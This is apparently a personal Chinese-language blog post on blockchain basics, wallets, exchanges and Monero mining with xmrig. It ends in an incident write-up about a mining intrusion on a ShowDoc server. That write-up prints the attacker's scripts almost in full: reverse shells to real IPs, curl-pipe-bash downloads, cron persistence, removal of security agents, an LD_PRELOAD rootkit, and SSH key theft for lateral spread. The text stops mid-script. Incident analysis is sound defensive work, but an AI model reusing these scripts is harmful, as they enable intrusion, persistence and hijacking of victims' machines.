---
layout: "post"
title: "区块链"
date: "2021-02-26 18:34"
categories: [arch]
---

## 简介

- 区块链（Blockchain）：它是一种特殊的分布式数据库 [^1]
    - 区块链没有管理员，它是彻底无中心的
    - 区块链由一个个区块（block）组成，区块由区块头（Head）和区块体（Body）组成
        - 区块头保存当前区块的特征值：当前时间、上一个区块的Hash、当前区块体Hash、Nonce(随机项，工作量证明，计算正确hash值的次数)等
        - 区块体保存实际数据，大小为1M
    - 每个块类似链表进行连接（下一个区块记录了上一个区块的区块头Hash）
- 挖矿
    - 通过大量计算，将数据成功写入到区块链中即是采矿。每次写入数据，就是创建一个区块
    - 新的有效区块规则
        - `目标值 = 一个常量 / 难度系数`。难度系数越大，目标值就越小
        - 只有小于目标值的哈希才是有效的，否则哈希无效，必须重算
        - 通过改变Nonce值(一般只能用穷举，最大可以到21.47亿)，从而时区块头数据改变，从而计算出不同的Hash，直到找到正确的Hash；如果穷举到Nonce到最大，协议允许矿工改变区块体，开始新的计算
        - 难度系数的动态调节：中本聪设计了难度系数的动态调节机制，将产出速率趋于十分钟每个
    - 区块链的分叉
        - 新节点总是采用最长的那条区块链。如果区块链有分叉，将看哪个分支在分叉点后面，先达到6个新区块（称为"六次确认"）。按照10分钟一个区块计算，一小时就可以确认，因此比特币交易一般有1小时左右的延迟
    - 比特币挖矿为什幺烧显卡: http://www.elecfans.com/xinkeji/611328.html
- 挖矿的人叫矿工，挖矿的机器叫矿机/工人
- 矿池
    - 即多人合作挖矿，获得的比特币奖励也由多人依照贡献度分享
    - 矿池费率计算方式：PPS、PPS+、FPPS、PPLNS、SOLO
- 钱包
    - 热钱包类似股票的交易账户，冷钱包就像管理证券账户的银行
    - 如币安有一个现货账户(可直接购买各种数字货币)，和一个C2C账户(用户和用户直接进行银行卡-法定数字货币交易)
- 交易所
    - [币安](https://www.binance.com/zh-CN)，参考: http://www.pc6.com/infoview/Article_188310.html
- 参考文章
    - [区块链入门教程](https://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html)
    - [比特币入门教程](http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html)
    - [基于java开发一套简易的区块链系统](https://www.codenong.com/cs106604338/)
    - [数字货币导航](https://1234btc.com/)

## 相关概念

- 区块链分类 [^4]
    - `公有链`
        - 世界上任何个体或者团体都可以接入，发送交易。公有区块链是最早的区块链，例如`BTC`、`以太坊`等虚拟数字货币均基于公有区块链
        - 如果把比特币网络看作是一套分布式的数据库，而以太坊则更进一步，它可以看作是一台分布式的计算机：区块链是计算机的ROM，合约是程序，而以太坊的矿工们则负责计算，担任CPU的角色
        - `以太坊`作为平台可以在其上开发新的应用，单平台性能不足，经常出现网络拥堵的情况，可用来学习开发与测试
    - `联盟链`
        - 由某个群体内部指定多个预选的节点为记账人，每个块的生成由所有的预选节点共同决定（预选节点参与共识过程），其他接入节点可以参与交易，但有权限限制，信息受保护，如银联组织
        - 联盟链拥有区块链技术的大部分特征，并且在权限管理、数据安全、监管方面更有优势，是企业优先考虑的区块链技术方案
        - `Hyperledger Fabric` 也叫`超级账本`，它是 IBM 贡献给 Linux 基金会的商用分布式账本，是面向企业应用的全球最大的分布式开源项目
        - 国内一些大的软件厂商也都有自己的企业区块链技术解决方案，例如`蚂蚁金服区块链平台`，腾讯的`TrustSQL`平台，东软的`SaCa EchoTrust`区块链应用平台以及`京东区块链防伪追溯平台`等等
    - `私有链`
        - 仅仅使用区块链的总账技术进行记账，可以是一个公司，也可以是个人，独享该区块链的写入权限，利用区块链的不易篡改特性，把区块链作为账本数据库来使用
- 共识机制 [^4]
    - 是通过特殊节点的投票，在很短的时间内完成对交易的验证和确认，对一笔交易，如果利益不相干的若干个节点能够达成共识，我们就可以认为全网对此也能够达成共识
    - 目前，较为主流的共识算法有PoW、PoS、DPoS、PBFT等，在实际使用时，每种算法都有各自的优点和缺点
    - PoW：工作量证明（Proof of Work），顾名思义就是对工作量的证明。BTC网络使用此算法(穷举Nonce值以找到正确Hash)
- 智能合约
    - 智能合约是一段部署在在区块链上的程序代码，当满足程序设定的条件时，它便会在区块链上运行，并得到相应的结果
    - 这种情况有点类似于微信的小程序，区块链提供虚拟机和脚本语言，用户根据脚本语言的语法开发带有一定业务逻辑的程序，部署在区块链上，当满足执行的条件时，智能合约便会被区块链虚拟机解释并运行
    - 典型的应用便是以太坊平台的智能合约，在这个平台里可以支持用户通过简单的几行代码就能实现他们想要的合约，实现无需人为监督的、不可篡改、自动化运行的合约

## 相关开源项目

- [gitee区块链开源项目](https://gitee.com/explore/blockchain)
- [blockchain](https://gitee.com/jonluo/blockchain)
    - 区块链技术学习程序样例
- [md_blockchain](https://gitee.com/tianyalei/md_blockchain)
    - Java区块链平台，基于Springboot开发的区块链平台
    - 该项目属于"链"，非"币"，不涉及虚拟币和挖矿
- [hyperledger](https://cn.hyperledger.org/) [^3]
    - Hyperledger Burrow：（之前称为 eris-db）是一种智能合约机，其中有一部分是根据以太坊虚拟机（EVM）规范构建的。
    - [Hyperledger Fabric](https://github.com/hyperledger/fabric)：也叫超级账本。是区块链技术的一种实现，旨在作为开发区块链应用程序或解决方案的基础。开发环境建立在VirtualBox虚拟机上，部署环境可以自建网络，也可以直接部署在BlueMix上，部署方式可 传统可docker化，共识达成算法插件化，支持用Go和Java开发智能合约，尤以企业级的安全机制和membership机制为特色。Fabric之于区块链，很可能正如Hadoop之于大数据
    - Hyperledger Iroha：是一个分布式分类帐项目，旨在简化并易于整合到需要分布式分类帐技术的基础设施项目中。
    - Hyperledger Sawtooth：是一种模块化区块链套件，旨在实现多功能性和可扩展性
- [以太坊](https://www.ethereum.org/)
    - 公有链，任何人都可以加入以太坊网络，并且交易是透明的，欢迎公开审计
    - 做共享账本的，有代币和挖矿等模块
    - [以太坊中文导航](https://123eth.org/)
- [Web3j](https://github.com/web3j/web3j)
    - Web3j是一个用于连接以太坊节点的客户端开发库（Corda和Pantheon 则都是完整的区块链节点实现）
- [Corda](https://github.com/corda/corda)
    - 包含了业务流程、消息以及其他企业应用中的熟悉的概念
- Bletchley
    - 微软开源区块链平台项目
- [Bitcoinj](https://github.com/bitcoinj/bitcoinj)
    - Bitcoinj是最流行的比特币协议的Java实现

## 区块链架构

![blockchain-arch.png](/data/images/arch/blockchain-arch.png)

- 主流的区块链技术架构主要分为五层 [^4]
    - 数据层：是最底层的技术，主要实现了数据存储、账户信息、交易信息等模块，数据存储主要基于Merkle树，通过区块的方式和链式结构实现，而账户和交易基于数字签名、哈希函数和非对称加密技术等多种密码学算法和技术，来保证区块链中数据的安全性
    - 网络层：主要实现网络节点的连接和通讯，又称点对点技术，各个区块链节点通过网络进行通信
    - 共识层：是通过共识算法，让网络中的各个节点对全网所有的区块数据真实性正确性达成一致，防止出现拜占庭攻击、51攻击等区块链共识算法攻击
    - 激励层：主要是实现区块链代币的发行和分配机制，是公有链的范畴
    - 应用层：一般把区块链系统作为一个平台，在平台之上实现一些去中心化的应用程序或者智能合约，平台提供运行这些应用的虚拟机

## 虚拟货币

- [虚拟货币行情](https://www.coingecko.com/zh)
- 加密钱包(安全度: 冷钱包 > 热钱包 > 交易所托管钱包)
    ![blk-wallet](../../data/images/2024/blockchain/blk-wallet.png)

    - 交易所托管钱包: 资产由平台托管(密钥为交易所系统提供的)
        - 中心化交易所（CEX，主流，支持支付宝/微信/银行卡等）: 如 Binance (币安), OKX(欧易), Bitget, Coinbase
        - 去中心化交易所（DEX）: 如 Uniswap (以太坊), PancakeSwap (BSC), 虽属于 “交易工具”，但资产由用户热钱包托管
    - 热钱包(一个App, 需防钓鱼、病毒): 下载一个比特币钱包应用，注册登录之后，系统就会为你生成一对密钥：一个私钥，一个公钥。这个私钥就像是你账户的唯一密码(重要)，而公钥则用来接收比特币。每次你想发起一笔交易时，钱包会通过网络连接到比特币区块链，获取最新的账本信息，并使用你的私钥对这笔交易进行签名
        - 手机 APP 钱包（主流）: MetaMask, Trust Wallet, Coinbase Wallet, Exodus Wallet
        - 网页钱包: 如 MetaMask 网页版（需谨慎辨别官网，防钓鱼）
    - 冷钱包(一个App+保险柜, 记住密钥, 不要暴露在网上)
        - 硬件冷钱包（主流）: 如 Onekey(开源, 国内发货不用过海关开箱), Trezor, Ledger Nano S，私钥存储在硬件设备中，仅在设备内运算，不联网
        - 纸钱包：将私钥（或助记词）手写 / 打印在纸上，完全物理隔离（需防丢失、损坏）
- 最大的几个交易所
    - [币安](https://www.binance.us), [国内(暂停服务,只能提现; 大陆和美国IP无法交易, 可使用台湾IP)](https://www.binance.com)
        - 现货交易: 0.08%-0.1%的手续费
    - [欧易(OKX)](https://www.okx.com/zh-hans)

### 门罗币(XMR)

- [官网](https://www.getmonero.org/zh-cn/index.html)
- ~~[Web端钱包(2026停运)](https://wallet.mymonero.com)~~ 也可下载客户端
    - [申请门罗钱包](https://mp.weixin.qq.com/s/yxuO51VanFnVfRTCOJFvBA)
- 挖矿收益计算: https://www.babaofan.com/miner/
- 矿池
    - https://minexmr.com/ 最小提现0.004XMR
    - https://www.minergate.com/ 最小提现0.005XMR
    - https://www.supportxmr.com/、https://www.xmrpool.me/ 最小提现0.1XMR
- 门罗币挖矿程序
    - [挖矿教程](https://www.xmr-zh.com/tech/mining-tech.html)
    - [xmr-stak](https://github.com/fireice-uk/xmr-stak)
    - [xmrig](https://github.com/xmrig/xmrig) 支持Windows/Linux/MacOS，[官方文档](https://xmrig.com/docs/miner)

        ```bash
        # xmrig
        wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
        tar -zxvf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1
        # 修改
            # pools.url="sg.minexmr.com:4444"(矿池, windows也可直接使用sg.minexmr.com)
            # pools.user="25dGDsxxxx"(钱包地址)
            # pools.rig-id="w001"(机器名, 任意)；有的是修改pools.pass来显示机器名，还有点是设置`pools.user=钱包地址.机器名`
            # donate-level=1(捐献比，最小1%)
        # 可适当修改
            # cpu.max-threads-hint=80(暂用CPU比例)
            # "rx": [0, 1, 2] 表示启动 3 个 CPU 核心
        # 运行中
            # hupa pages=100% 表示开启了大内存优化(否则建议优化, linux下管理员启动即可). https://xmrig.com/docs/miner/hugepages
        vi config.json # 修改配置后，无需重启
        sudo ./xmrig # 可使用screen命令后台运行

        # docker 部署
        docker run --restart=always --network host -d -v /etc/xmrig/config.json:/etc/xmrig/config.json -e CPU_USAGE=80 --name xmr snowdream/xmr

        # 查看是否有GPU
        lspci | grep -i vga # 查看是否有AMD
        lspci | grep -i nvidia # 查看是否有N卡
        ```
    - Centos下CPU加入MinerGate矿池教程 https://www.bobobk.com/973.html
        - centos7上编译CPUMiner-Multi并在minergate矿池中挖矿，不过由于是cpu，效率较低，1核的速度只有大约20 H/s的速度

## Web3.0

![web3.0与web2.0应用对比](/data/images/arch/web3.0-web2.0.png)

### 分布式文件存储IPFS

- https://ipfs.tech
- https://blog.csdn.net/inthat/article/details/106206591

- IPFS属于Web3.0的应用范畴，相当于Web2.0中的dropbox
- IPFS是一个点对点的分布式文件系统（比特币是一种点对点的电子现金系统），目标是为了补充（甚至是取代）目前统治互联网的超文本传输协议（HTTP），将所有具有相同文件系统的计算设备连接在一起。原理用基于内容的地址替代基于域名的地址，也就是用户寻找的不是某个地址而是储存在某个地方的内容，不需要验证发送者的身份，而只需要验证内容的哈希，通过这样可以让网页的速度更快、更安全、更健壮、更持久
- 互联网是建立在HTTP协议上的，HTTP协议的中心化造成效率非常低，并且成本还很高
    - 一旦使用HTTP协议每次需要从中心化的服务器下载完整的文件(网页,视频,图片等),速度慢,效率低。如果改用P2P的方式下载,可以节省近60%的带宽. P2P将文件分割为小的块,从多个服务器同时下载,速度非常快.
    - 还有一种就是web文件经常被删除。我们可能在上网的过程中会遇到，收藏某个网页，在使用的时候浏览器网页会显示404。IPFS提供了文件的历史版本回溯功能(就像git版本控制工具一样),可以很容易的查看文件的历史版本,数据可以得到永久保存

## 挖坑程序入侵案例

### 基于apache-php-linux环境的ShowDoc应用

- 服务器症状
    - 发现服务器CPU和内存占用较高
    - 且出现很多apache用户进程，如`apache   19483     1 13 May08 ?        02:32:29 /tmp/.inis`和`apache   19483     1 13 May08 ?        02:32:29 /tmp/.libs`等
    - ShowDoc应用文件上传目录，存在一些`.php`的脚本文件，且存在`xmrig`的执行程序
- 查看`/tmp/.inis`发现如下

```bash
#!/bin/bash
while :
do
if [ -w /usr/sbin ]; then
  SPATH=/usr/sbin
else
  SPATH=/tmp
fi
MD5_1_XMR="e5c3720e14a5ea7f678e0a9835d28283"
MD5_2_XMR=`md5sum $SPATH/.libs | awk '{print $1}'`
if [ "$MD5_1_XMR" = "$MD5_2_XMR" ]
then
  if [ $(netstat -ant|grep '107.172.214.23:80'|grep 'ESTABLISHED'|grep -v grep|wc -l) -eq '0' ]
  then
    $SPATH/.libs
  elif [ $(netstat -ant|grep '198.46.202.146:8899'|grep 'ESTABLISHED'|grep -v grep|wc -l) -eq '0' ]
  then
    bash -i >& /dev/tcp/198.46.202.146/8899 0>&1
  else
    echo "ok"
  fi
else
  (curl -s http://w.apacheorg.top:1234/xmss||wget -q -O - http://w.apacheorg.top:1234/xmss)|bash -sh
fi
sleep 30m
done
```
- 且查看定时任务列表

    ```bash
    # sudo crontab -u apache -l
    30 23 * * * (curl -s http://w.apacheorg.top:1234/xmss||wget -q -O - http://w.apacheorg.top:1234/xmss )|bash -sh
    ```
- 上述脚本会从`http://w.apacheorg.top:1234/xmss`下载一个脚本

<details>
<summary>脚本内容</summary>

```bash
#!/bin/bash
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
setenforce 0 2>/dev/null
ulimit -n 65535
ufw disable
iptables -F
echo "vm.nr_hugepages=$((1168+$(nproc)))" | tee -a /etc/sysctl.conf
sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
netstat -antp | grep ':3333'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep ':4444'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep ':5555'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep ':7777'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep ':14444'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep ':5790'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep ':45700'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep ':2222'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep ':9999'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep ':20580'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep ':13531'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep '23.94.24.12'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
netstat -antp | grep '134.122.17.13'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
netstat -antp | grep '66.70.218.40'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
netstat -antp | grep '209.141.35.17'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
echo "123"
netstat -antp | grep '119.28.4.91'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
netstat -antp | grep '101.32.73.178'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
netstat -antp | grep 185.238.250.137 | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
netstat -antp | grep tmate | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
netstat -antp | grep kinsing | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
netstat -antp | grep kdevtmpfsi | awk '{print $7}' | awk  -F '[/]' '{print $1}' | xargs -I % kill -9 %
netstat -antp | grep pythonww | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
netstat -antp | grep tcpp | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
netstat -antp | grep c3pool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
netstat -antp | grep xmr | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
netstat -antp | grep f2pool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
netstat -antp | grep crypto-pool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
netstat -antp | grep t00ls | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
netstat -antp | grep vihansoft | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
netstat -antp | grep mrbpool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
ps -fe | grep '/usr/sbin/sshd' | grep 'sshgood' | grep -v grep  | awk '{print $2}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
ps aux | grep -a -E "kdevtmpfsi|kinsing|solr|f2pool|tcpp|xmr|tmate|185.238.250.137|c3pool" | awk '{print $2}' | xargs kill -9

der(){
  if ps aux | grep -i '[a]liyun'; then
    (wget -q -O - http://update.aegis.aliyun.com/download/uninstall.sh||curl -s http://update.aegis.aliyun.com/download/uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
    (wget -q -O - http://update.aegis.aliyun.com/download/quartz_uninstall.sh||curl -s http://update.aegis.aliyun.com/download/quartz_uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/quartz_uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
    pkill aliyun-service
    rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
    rm -rf /usr/local/aegis*
    systemctl stop aliyun.service
    systemctl disable aliyun.service
    service bcm-agent stop
    yum remove bcm-agent -y
    apt-get remove bcm-agent -y
    /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop
    /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove
    rm -rf /usr/local/cloudmonitor
  elif ps aux | grep -i '[y]unjing'; then
    /usr/local/qcloud/stargate/admin/uninstall.sh
    /usr/local/qcloud/YunJing/uninst.sh
    /usr/local/qcloud/monitor/barad/admin/uninstall.sh
  fi
  sleep 1
  echo "DER Uninstalled"
}

der
if ! [ -z "$(command -v wdl)" ] ; then DLB="wdl -O " ; fi ; if ! [ -z "$(command -v wge)" ] ; then DLB="wge -O " ; fi
if ! [ -z "$(command -v wget2)" ] ; then DLB="wget2 -O " ; fi ; if ! [ -z "$(command -v wget)" ] ; then DLB="wget -O " ; fi
if ! [ -z "$(command -v cdl)" ] ; then DLB="cdl -Lk -o " ; fi ; if ! [ -z "$(command -v cur)" ] ; then DLB="cur -Lk -o " ; fi
if ! [ -z "$(command -v curl2)" ] ; then DLB="curl2 -Lk -o " ; fi ; if ! [ -z "$(command -v curl)" ] ; then DLB="curl -Lk -o " ; fi
echo $DLB
url="w.apacheorg.top:1234"
liburl="http://107.172.214.23:1234/.libs"

cronlow(){
  cr=$(crontab -l | grep -q $url | wc -l)
  if [ ${cr} -eq 0 ];then
    crontab -r
    (crontab -l 2>/dev/null; echo "30 23 * * * (curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh")| crontab -
  else
    echo "cronlow skip"
  fi
}

if [ -w /usr/sbin ]; then
  SPATH=/usr/sbin
else
  SPATH=/tmp
fi
echo $SPATH

echo 'handling download itself ...'
if cat /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1 | grep -q "205.185.113.151\|5.196.247.12\|bash.givemexyz.xyz\|194.156.99.30\|cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xOTQuMTU2Ljk5LjMwL2QucHkiKS5yZWFkKCkpJw==\|bash.givemexyz.in\|205.185.116.78"
then
  chattr -i -a /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1
  crontab -r
fi
if crontab -l | grep "$url"
then
  echo "Cron exists"
else
  apt-get install -y cron
  yum install -y vixie-cron crontabs
  service crond start
  chkconfig --level 35 crond on
  echo "Cron not found"
  echo -e "30 23 * * * root (curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh\n##" > /etc/cron.d/`whoami`
  echo -e "30 23 * * * root (curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh\n##" > /etc/cron.d/apache
  echo -e "30 23 * * * root (curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh\n##" > /etc/cron.d/nginx
  echo -e "30 23 * * * (curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh\n##" > /var/spool/cron/`whoami`
  mkdir -p /var/spool/cron/crontabs
  echo -e "30 23 * * * (curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh\n##" > /var/spool/cron/crontabs/`whoami`
  mkdir -p /etc/cron.hourly
  echo "(curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh" > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/cron.hourly/oanacroner1
  echo "(curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh" > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/init.d/down
  chattr +ai -V /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1 /etc/init.d/down
fi
chattr -i -a /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1
echo "(curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh" > /etc/init.d/down | chmod 755 /etc/init.d/down

localgo() {
  echo "localgo start"
  myhostip=$(curl -sL icanhazip.com)
  KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
  KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
  KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
  KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
  HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
  HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
  HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $2}' | awk -F '{print $1}')
  HOSTS4=$(cat /etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}')
  HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
  HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
  USERZ=$(
    echo "root"
    find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -wv ".ssh"
  )
  USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)
  sshports=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}' | awk '{print $1}' | sed 's/[^0-9]*//g' | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | sed -e "\$a22")
  userlist=$(echo "$USERZ $USERZ2" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | grep -vw "." | grep -vw "ssh" | sed '/\./d')
  hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  i=0
  for user in $userlist; do
    for host in $hostlist; do
      for key in $keylist; do
        for sshp in $sshports; do
          ((i++))
          if [ "${i}" -eq "20" ]; then
            sleep 5
            ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
            i=0
          fi

          #Wait 5 seconds after every 20 attempts and clean up hanging processes

          chmod +r $key
          chmod 400 $key
          echo "$user@$host"
          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "(curl -s http://$url/xmss||wget -q -O - http://$url/xmss)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms"
          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "(curl -s http://$url/xmss||wget -q -O - http://$url/xmss)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms"
        done
      done
    done
  done
  # scangogo
  echo "local done"
}

MD5_1_XMR="e5c3720e14a5ea7f678e0a9835d28283"
MD5_2_XMR=`md5sum $SPATH/.libs | awk '{print $1}'`

if [ "$SPATH" = "/usr/sbin" ]
then
  chattr -ia / /usr/ /usr/local/ /usr/local/lib/ 2>/dev/null
  if [ "$MD5_1_XMR" = "$MD5_2_XMR" ]
  then 
    if [ $(netstat -ant|grep '107.172.214.23:80'|grep 'ESTABLISHED'|grep -v grep|wc -l) -eq '0' ]
    then
      $SPATH/.libs
      chattr -ia /etc/ /usr/local/lib/libs.so  /etc/ld.so.preload 2>/dev/null
      chattr -ai /etc/ld.so.* 2>/dev/null
      $DLB /usr/local/lib/libs.so http://$url/libs.so
      export LD_PRELOAD=/usr/local/lib/libs.so
      sed -i 's/\/usr\/local\/lib\/ini.so//' /etc/ld.so.preload
      sed -i 's/\/usr\/local\/lib\/libs.so//' /etc/ld.so.preload
      echo '/usr/local/lib/libs.so' >> /etc/ld.so.preload
      chattr +ai $SPATH/.libs $SPATH/.inis /usr/local/lib/libs.so /etc/ld.so.preload 2>/dev/null
      localgo
    elif [ $(netstat -ant|grep '192.210.200.66:8899'|grep 'ESTABLISHED'|grep -v grep|wc -l) -eq '0' ]
    then
      $DLB $SPATH/.inis http://$url/inis
      chmod +x $SPATH/.inis 2>/dev/null
      nohup $SPATH/.inis &
      nohup bash -i >& /dev/tcp/192.210.200.66/8899 0>&1 &
    else
      echo "ok"
      chattr -ia /etc/ /usr/local/lib/libs.so /etc/ld.so.preload 2>/dev/null
      chattr -ai /etc/ld.so.* 2>/dev/null
      $DLB /usr/local/lib/libs.so http://$url/libs.so
      sed -i 's/\/usr\/local\/lib\/ini.so//' /etc/ld.so.preload
      sed -i 's/\/usr\/local\/lib\/libs.so//' /etc/ld.so.preload
      export LD_PRELOAD=/usr/local/lib/libs.so
      echo '/usr/local/lib/libs.so' >> /etc/ld.so.preload
      chattr +ai $SPATH/.libs $SPATH/.inis /usr/local/lib/libs.so /etc/ld.so.preload 2>/dev/null
      localgo
    fi
    localgo
  else
    chattr -ia /etc/ /usr/local/lib/libs.so /etc/ld.so.preload 2>/dev/null
    chattr -ai /etc/ld.so.* 2>/dev/null
    chattr -ai /usr/sbin/.libs 2>/dev/null
    chattr -ai /usr/sbin/.inis 2>/dev/null
    rm -f $SPATH/.libs
    rm -f $SPATH/.inis
    $DLB $SPATH/.libs $liburl
    $DLB /usr/local/lib/libs.so http://$url/libs.so
    $DLB $SPATH/.ini http://$url/inis
    export LD_PRELOAD=/usr/local/lib/libs.so
    sed -i 's/\/usr\/local\/lib\/ini.so//' /etc/ld.so.preload
    sed -i 's/\/usr\/local\/lib\/libs.so//' /etc/ld.so.preload
    echo '/usr/local/lib/libs.so' >> /etc/ld.so.preload
    chattr +ia /usr/local/lib/libs.so
    chattr +ia /usr/local/lib/inis.so
    chmod +x $SPATH/.libs 2>/dev/null
    chmod +x $SPATH/.inis 2>/dev/null
    $SPATH/.libs
    nohup $SPATH/.inis 1>/dev/null 2>&1 &
    nohup bash -i >& /dev/tcp/192.210.200.66/8899 0>&1 &
    chattr +ai $SPATH/.libs
    chattr +ai $SPATH/.inis
    localgo
  fi
else
